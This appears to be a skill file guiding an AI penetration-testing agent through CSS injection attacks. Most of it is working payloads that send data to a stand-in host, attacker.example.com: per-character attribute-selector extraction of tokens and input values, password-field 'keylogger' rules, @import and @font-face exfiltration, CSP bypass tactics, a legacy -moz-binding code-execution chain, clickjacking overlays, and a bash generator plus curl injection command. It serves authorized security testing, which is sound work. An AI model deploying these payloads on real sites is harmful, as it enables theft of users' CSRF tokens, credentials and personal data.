---
name: css-injection
description: "CSS injection exploitation for data exfiltration via attribute selectors, keylogger injection, and UI redressing"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["css injection", "css data exfiltration", "attribute selector", "css keylogger", "exfil via css", "css injection attack", "blind css", "style injection", "css exfiltration"]
contextBoosts: [auth]
mitreAttack: ["T1189", "T1059.007"]
owaspRefs: ["OWASP Top 10 A03:2021 Injection"]
---

# CSS Injection

## When to Use

- Target accepts user-controlled CSS or style input (e.g., profile customization, theme settings, rich text editors).
- HTML attributes (`value`, `href`, `src`, `alt`, `title`) contain sensitive data (tokens, emails, names).
- CSP blocks JavaScript but allows external stylesheets or inline style loading.
- UI redressing / clickjacking via `position: fixed` overlays.
- Blind injection where only out-of-band callbacks (DNS/HTTP) are observable.

## When NOT to Use

- No user-controlled style or CSS input vector exists.
- Content Security Policy blocks external resource loads entirely (no `style-src`, no `img`).
- Target renders user input inside `<style>` tags but sanitizes or strips attribute selectors.
- Data to exfiltrate is not reflected in any renderable HTML attribute.

## Auth Context

CSS injection is most powerful when the attacker is authenticated and the target stores per-user style preferences or reflects attributes from authenticated pages. Authentication state determines which attributes (tokens, session IDs, profile fields) are present in the DOM and therefore exfiltratable.

---

## CSS Injection Basics

CSS injection occurs when user-controlled input is inserted into a `<style>` block, a `style` attribute, or an external stylesheet reference without proper sanitization. The fundamental primitive is:

```css
background: url(https://attacker.example.com/callback?stolen=data);
```

**Payload:** style-tag / style-attribute injection probe:

```html
<style>
  body { background: url(https://attacker.example.com/css-probe?hit=1); }
</style>

<div style="background:url(https://attacker.example.com/css-probe?attr=1)">
```

Common injection points:

- Profile fields rendered as inline styles: `<div style="USER_INPUT">`
- Theme customization stored and reflected in `<style>` blocks.
- Rich text editors that preserve `<style>` tags.
- URL parameters reflected into stylesheet `href` attributes.
- Markdown processors that allow raw HTML including `<style>`.

### Confirming CSS Injection

CSS injection is confirmed when injected styles render and the attacker-controlled server receives a callback (e.g., `https://attacker.example.com/callback?stolen=data`).

---

## Data Exfiltration via Attribute Selectors

CSS attribute selectors match HTML attribute values and can trigger resource loads conditionally. The `value` attribute of `<input>` fields, `href` on links, `src` on images, and `alt`/`title` on elements are all exfiltratable.

### Syntax

**Payload:** attribute-selector exfiltration — each rule triggers a callback only when the attribute value starts with the given character:

```css
input[value^="a"] { background: url(//attacker.example.com/exfil?char=a); }
input[value^="b"] { background: url(//attacker.example.com/exfil?char=b); }
input[value^="c"] { background: url(//attacker.example.com/exfil?char=c); }
/* ... one rule per candidate character ... */
```

### Attribute Selectors

| Selector | Matches | Example |
|----------|---------|---------|
| `[attr^="val"]` | Starts with `val` | `[value^="admin"]` matches `value="admin123"` |
| `[attr$="val"]` | Ends with `val` | `[value$="@gmail.com"]` matches `value="user@gmail.com"` |
| `[attr*="val"]` | Contains `val` | `[value*="session"]` matches `value="abc-session-xyz"` |
| `[attr\|="val"]` | Exact or starts with `val-` | `[href\|="https://example.com"]` |
| `[attr~="val"]` | Space-separated word match | `[title~="token"]` |

---

## Character-by-Character Extraction

Extracting a full value requires iterating over each position. For a token of length N, generate N sets of rules, each set covering all possible characters for that position.

### Generation Template

```css
/* Position 0: which character does the value start with? */
input[value^="0"] { background-image: url(//attacker.example.com/exfil?p=0&c=0); }
input[value^="1"] { background-image: url(//attacker.example.com/exfil?p=0&c=1); }
/* ... a-z, 0-9 ... */

### Known Prefix Building

Once position 0 is confirmed (callback received for that character), the prefix grows:

/* Prefix "a8f" confirmed — probe position 3 */
input[value^="a8f0"] { background-image: url(//attacker.example.com/exfil?p=3&c=0); }
input[value^="a8f1"] { background-image: url(//attacker.example.com/exfil?p=3&c=1); }
```

Each callback's `c` parameter appends one character to the known prefix; repeat until no rule fires (end of value).


### Optimization

- Use wildcard suffix to avoid needing exact length: `input[value^="a8f"]` matches regardless of remaining characters.
- Use `background-image` instead of `background` for better cross-browser support.
- Use `@font-face` + `font-family` for cleaner exfiltration (avoids image load timing issues).
- Batch character sets into fewer rules using `[value^="a"], [value^="b"], [value^="c"]` with comma-separated selectors when the server distinguishes via query parameter.

---

## CSS Keylogger

A CSS keylogger captures keystrokes by styling input elements based on `:focus` and pseudo-class states. The attacker cannot observe real-time keystrokes directly, but can exfiltrate data by triggering resource loads on specific CSS conditions.

### Focus-Based Keylogger

```css
input[type="password"] {
  background-image: url(//attacker.example.com/log?field=password);
}
input:focus {
  background-image: url(//attacker.example.com/log?event=focus);
}
```

### Attribute-Based Keystroke Inference

When input fields have dynamic attributes that change with each keystroke (e.g., `aria-describedby`, `data-length`, custom attributes), attribute selectors can track changes:


### Password Field Keylogger (Attribute Dependent)

If the password field reflects typed characters in a `value` attribute (e.g., auto-fill, some JS frameworks):

```css
input[type="password"][value$="a"] { background-image: url(//attacker.example.com/keys?last=a); }
input[type="password"][value$="b"] { background-image: url(//attacker.example.com/keys?last=b); }
input[type="password"][value^="a"] { background-image: url(//attacker.example.com/keys?first=a); }
input[type="password"][value^="b"] { background-image: url(//attacker.example.com/keys?first=b); }
```

### Practical Limitations

- CSS keyloggers require the attribute to update in the DOM with each keystroke — most standard `<input>` fields do NOT expose `value` via CSS attribute selectors in real-time.
- More reliable when combined with JavaScript that sets a data attribute on each keypress.
- `:focus` pseudo-class is the most reliable but only gives a single callback per focus event.

---

## Blind CSS Injection

When no direct rendering is visible, CSS injection can still exfiltrate data from HTML attributes via out-of-band callbacks.

### Exfiltrating from `href` Attributes

```css
a[href^="https://target.com/token="] { background: url(//attacker.example.com/exfil?href-prefix-hit); }
a[href*="csrf"] { background: url(//attacker.example.com/exfil?href-contains=csrf); }
```

### Exfiltrating from `src` Attributes

```css
img[src^="/avatars/admin"] { background: url(//attacker.example.com/exfil?src=admin-avatar); }
img[src*="session"] { background: url(//attacker.example.com/exfil?src=session); }
```

### Exfiltrating from `title` and `alt` Attributes

```css
[title^="Bearer "] { background: url(//attacker.example.com/exfil?title=bearer); }
img[alt*="@gmail.com"] { background: url(//attacker.example.com/exfil?alt=email); }
```

### Exfiltrating via `@import`

**Payload:** injected style pulls a second attacker-hosted stylesheet containing the full rule set:

```css
@import url(//attacker.example.com/payload.css);
```

`payload.css` holds the per-character rules, so the injection stays a one-liner and rules can be rotated without re-injecting.

### Exfiltrating via `@font-face`

```css
@font-face {
  font-family: exfil;
  src: url(//attacker.example.com/font?leak=hit) format('woff');
}
input[value^="secret"] { font-family: exfil; }
```


This is often more reliable than `background-image` because font loading is less likely to be blocked or cached.

---

## CSP Bypass

Content Security Policy may block inline scripts but CSS injection often operates under different CSP rules.

### Common CSP Bypass Scenarios

| CSP Directive | CSS Injection Impact |
|---------------|---------------------|
| `script-src 'self'` | No effect — CSS injection does not use `<script>` |
| `style-src 'self'` | Blocks external stylesheets but inline `style` attributes may still work |
| `style-src 'unsafe-inline'` | Allows `<style>` blocks — full CSS injection |
| `img-src 'self'` | Blocks `background-image` to external domains — use `@font-face` or `@import` |
| `connect-src 'self'` | Blocks XHR/fetch but does not affect CSS resource loads (`background`, `@import`) |
| No `style-src` directive | Default `script-src` applies to styles — may block inline |

### Bypass Techniques

1. **@import in external stylesheet**: If `style-src` allows external sheets, host CSS on attacker server that uses `@import` to load a second stylesheet containing exfiltration rules.

2. **@font-face bypass**: `font-src` is separate from `img-src`. If `font-src` is unrestricted, exfiltrate via font loading.

3. **CSS Variables via URL**: Some CSP implementations do not block `url()` in CSS custom properties.

4. **Behavior-dependent bypass**: If CSP only blocks certain domains, use a domain that is whitelisted (e.g., a CDN that allows arbitrary path parameters).

5. **Partial CSP**: If CSP only sets `script-src` but not `style-src`, the default falls back to `script-src` which may or may not apply to CSS depending on the browser.

---

## Mutation XSS via CSS

CSS can trigger DOM mutations that enable XSS when combined with certain HTML patterns.

### Technique

**Payload:** `@import` + `-moz-binding` mutation chain (legacy Firefox):

```html
<style>
  @import url(https://attacker.example.com/mutation.css);
</style>
```

If the imported stylesheet contains:

```css
body {
  -moz-binding: url(https://attacker.example.com/bind.xml#exec);
}
```

In older Firefox versions, this could trigger XBL (XML Binding Language) execution.

### Modern Mutation Vectors

1. **CSS `content` property injection**: If user-controlled CSS can set `content` on elements that are later processed by JavaScript, the injected content may be interpreted as HTML.

2. **CSS `display` toggling**: Hide security-critical elements (CSRF tokens, confirmation buttons) via `display: none`, then exfiltrate when the form auto-submits.

3. **CSS + JavaScript interaction**: If a page reads computed styles and uses them in DOM operations, injecting `expression()` (IE) or `-moz-binding` can lead to code execution.

### UI Redressing (Clickjacking via CSS)

**Payload:** `position: fixed` overlay hiding a real button behind a decoy:

```html
<style>
  .overlay {
    position: fixed;
    top: 100px; left: 50px;
    z-index: 9999;
    background: #fff;
    padding: 20px;
  }
  /* hide the real security-critical element */
  #delete-account-btn { display: none; }
</style>
<div class="overlay">Click here to claim your prize</div>
```

Overlay an invisible iframe on top of a legitimate page element to trick users into clicking.

---

## Testing Methodology

### Step-by-Step

1. **Identify injection vector** — Find where user input is reflected in CSS context (inline `style`, `<style>` block, stylesheet `href`).

2. **Confirm renderability** — Inject a benign callback: `background: url(https://attacker.example.com/test?css=1)`. Verify the callback is received.

3. **Map target attributes** — Inspect the DOM for exfiltratable attributes: `value`, `href`, `src`, `alt`, `title`, `data-*` attributes. Identify which contain sensitive data.

4. **Generate exfiltration rules** — Create CSS rules targeting the identified attributes using attribute selectors. Use the character-by-character approach for full extraction.

5. **Deliver payload** — Inject via the identified vector. If stored injection (e.g., profile theme), the payload persists. If reflected, may need to craft a URL.

6. **Monitor callbacks** — Set up a listener (e.g., Burp Collaborator, interactsh, or a simple HTTP server) to capture incoming requests containing exfiltrated data.

7. **Iterate** — Build the extracted value character by character. Each confirmed callback narrows the prefix for the next position.

8. **Verify** — Once the full value is extracted, verify it works (e.g., use the extracted CSRF token in a request).

### Tool Commands

```bash
# Serve exfil rules + capture callbacks (simple listener)
python3 -m http.server 8080

# Generate per-character attribute-selector rules for a target prefix
for c in {a..z} {0..9}; do
  echo "input[value^=\"$c\"]{background:url(//attacker.example.com/exfil?c=$c);}"
done > payload.css

# Confirm the injection point renders: probe callback must appear in listener log
curl -X POST https://target.com/profile/theme \
  -d 'css=body{background:url(//attacker.example.com/css-probe?hit=1)}'
```

### Checklist

- [ ] User-controlled CSS input vector identified.
- [ ] Callback received confirming CSS renders.
- [ ] Exfiltratable HTML attributes mapped.
- [ ] Character-by-character extraction rules generated.
- [ ] Full sensitive value extracted via callbacks.
- [ ] CSP restrictions evaluated and bypasses identified.
- [ ] Finding documented with reproduction steps.

---

## Anti-Hallucination

**What must be verified by tool output, never assumed:**

- The callback URL was actually received — check DNS/HTTP logs, do not assume CSS rendered.
- The attribute selector matched — verify the callback parameter contains the expected character, not a false positive from caching or browser prefetch.
- The target attribute actually contains sensitive data — inspect the DOM via `evaluateRendered` or `parseResponse`, never guess attribute contents.
- CSP is not blocking the payload — if no callback received, check CSP headers via `getCapturedHeaders` before concluding injection failed.
- The CSS context is actually injectable — confirm the input is rendered inside a `<style>` tag or `style` attribute, not inside a JavaScript string or HTML entity-encoded context.

**What is tool-dependent:**

- Exfiltrated values — must come from actual callback parameters, never fabricated.
- CSP bypass success — must be confirmed by receiving callbacks, not by reading CSP headers alone (headers may differ from enforcement).
- Mutation XSS — requires actual DOM mutation observed via `evaluateRendered`, not theoretical possibility.
- CSS rendering — must be confirmed by callback, as browsers may strip or ignore malformed CSS.

## Trigger Conditions

Activate when user input lands in a CSS context — a `<style>` block, a `style` attribute, a stylesheet `href`, or `@import`/`@font-face` reference — and the surrounding CSP does not block style resource loads. Especially valuable when JS is blocked but styles load, or when sensitive data sits in reflected HTML attributes (`value`, `href`, `src`, `alt`, `title`, `data-*`) on authenticated pages. Do not trigger when no style input vector exists, when CSP blocks all external/img/font loads, or when the target strips attribute selectors.

## Detection Approach

Confirm injectability with a benign callback rule (`background: url(.../test)`) and verify the callback actually arrives before building exfiltration. Then map which DOM attributes carry sensitive data via `evaluateRendered`/`parseResponse`. Reason about extraction strategy: attribute selectors (`[value^="x"]`) can trigger per-character OOB callbacks; walk each position, narrowing the known prefix on each confirmed callback. If `img-src` blocks `background-image`, pivot to `@font-face`/`@import` (separate CSP directives). For keylogging, only attempt if attributes update per keystroke (rare for standard inputs). Always verify the CSS context is real — input inside a JS string or HTML-entity-encoded context is not injectable.

## Pitfalls

- Inferring the attribute holds sensitive data without inspecting the DOM — guesswork yields false positives.
- Concluding failure from no callback without first checking CSP (`style-src`/`img-src`/`font-src`) via captured headers.
- Assuming `background-image` exfil works when `img-src` restricts external domains — use `@font-face`/`@import`.
- Treating input reflected in a JS string or entity-encoded output as CSS-injectable.
- Counting on CSS keyloggers for normal `<input>` fields — their `value` is not CSS-observable in real time.
- Caching or browser prefetch producing phantom callbacks — confirm the character parameter matches expectation.

## Verification & Impact

CONFIRMED when the attacker-controlled listener actually receives callbacks whose query parameters contain the extracted characters/values, corroborated by DOM inspection of the target attribute. SUSPECTED when a benign callback fires but no sensitive data is recovered, or CSP blocks exfil — record as candidate. Document impact by what was exfiltrated (CSRF tokens, emails, session fragments) and the primitive proven (attribute-selector extraction, keylogger, UI redress). Always capture the injected style and received callbacks via `recordEvidence`.
